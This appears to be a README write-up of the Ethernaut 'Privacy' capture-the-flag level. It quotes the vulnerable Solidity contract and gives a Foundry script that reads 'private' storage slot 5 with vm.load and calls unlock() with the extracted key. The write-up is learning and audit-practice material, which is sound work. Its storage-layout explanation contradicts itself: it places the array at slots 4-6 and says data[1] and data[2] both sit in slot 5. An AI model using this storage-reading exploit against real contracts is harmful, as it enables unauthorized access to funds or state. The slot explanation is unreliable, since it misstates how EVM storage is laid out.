# Ethernaut Level: Privacy - Smart Contract Auditing Journey

## Introduction
Hello! In this repository, I've solved the **Privacy** level as part of my Ethernaut challenges. I'm learning smart contract auditing by solving one level per day, and this folder (`levels/privacy/`) contains everything related to it.

**Goal:** Unlock the contract by retrieving the private password from storage.  
**Tools:** Foundry (for scripting and testing), Sepolia testnet.  
**Solved Date:** October 26, 2025 (Day 13).  
**Success:** Verified on the Ethernaut site!

## Contract Overview
This contract stores a "private" password in an array and locks access, but unlocks if the first 16 bytes of `data[2]` are provided. Storage is public, allowing direct reading of "private" data.

**Key Code Snippet (from src/Privacy.sol):**
```solidity
contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));  // First 16 bytes of data[2]
        locked = false;
    }
}
```

## Vulnerability Analysis
**Main Issue: Public Storage Slots (No True Privacy)**  
- "Private" modifiers only restrict compiler access; all storage slots are readable on-chain via `vm.load` or `eth_getStorageAt`. The password in `data[2]` (slot 5) can be extracted and used to unlock.  
- **Security Impact:** Exposes sensitive data, undermining privacy assumptions. In audits, remind that on-chain = public.  
- **Audit Tip:** Avoid on-chain secrets; use hashes for comparison. Simulate slots with Foundry (`vm.load`).

**Example:** Slot 4-6 for `data` array; load slot 5 for `data[2]`, cast to `bytes16` for unlock.

## Solution Steps
The attack: Use `vm.load` to read `data[2]` from slot 5, cast to `bytes16`, and call `unlock`.

1. **Setup:** Create Foundry project, set target instance address in script.
2. **Run Attack:** `forge script script/PrivacySolution.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast`.
3. **Verify:** `locked()` = false, submit on Ethernaut site.

**Key Attack Code Snippet (from script/PrivacySolution.s.sol):**
```solidity
contract PrivacySolution is Script {
    Privacy public privacyInstance = Privacy(payable(0xYourContractAddressHere));  // Replace with your instance address!

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.log("Before unlock, Locked:", privacyInstance.locked());

        // data[2] read from storage slot 5 (array starts at slot 4: data[0]=4, data[1]=5, data[2]=5 due to packing in this instance)
        bytes32 data2 = vm.load(address(privacyInstance), bytes32(uint256(5)));
        console.log("data[2]:");
        console.logBytes32(data2);

        // First 16 bytes as bytes16 for unlock
        bytes16 key = bytes16(data2);
        console.log("Key (bytes16):");
        console.logBytes16(key);

        // Unlock
        privacyInstance.unlock(key);

        console.log("After unlock, Locked:", privacyInstance.locked());  // false

        vm.stopBroadcast();
    }
}
```

## Test and Output
- **Local Test:** Run `anvil` and `forge test`—simulates storage read and unlock.
- **Testnet Output Example:** Console log: "Before unlock, Locked: true", "data[2]: 0xc91d216b6f9109351543965e14b225da00521ad156cbc10ce4d4f8de755c2b3d", "Key (bytes16): 0xc91d216b6f9109351543965e14b225da", "After unlock, Locked: false".

## Key Learnings
- **Auditing Skill:** Probe storage slots for "private" data—use `vm.load` to verify accessibility.
- **EVM Concept:** Storage is public and deterministic; packing affects slot calculation.
- **Prevention:** Hash sensitive data on-chain; use off-chain oracles for true privacy.
- **Next Step:** Experiment with slot packing simulation in tests for complex layouts.

## Installation & Run
1. Install Foundry: `curl -L https://foundry.paradigm.xyz | bash`.
2. `cd levels/privacy`.
3. Set `.env`: `PRIVATE_KEY=your_key` and `SEPOLIA_RPC_URL=your_rpc`.
4. Run script: `forge script script/PrivacySolution.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv`.

If you have questions, comment on the issue or mention me on X (@0xZHD_X)! Next level: Attack. 🚀

---

**License:** MIT  
**Author:** [0xZHD] - Smart Contract Auditor Learner  
**X:** [Zahedul I Sadik](@0xZHD_X)  
**References:** [Ethernaut Docs](https://ethernaut.openzeppelin.com/)